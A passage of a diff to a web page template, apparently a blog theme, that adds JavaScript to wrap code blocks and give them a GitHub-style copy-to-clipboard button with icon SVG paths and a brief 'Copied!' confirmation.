0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
 var utterancesLoad=0;
 
 let themeSettings={
@@ -905,7 +889,70 @@ function iFrameLoading(){
     }
 }
 
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
 
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
 
 </script>
 
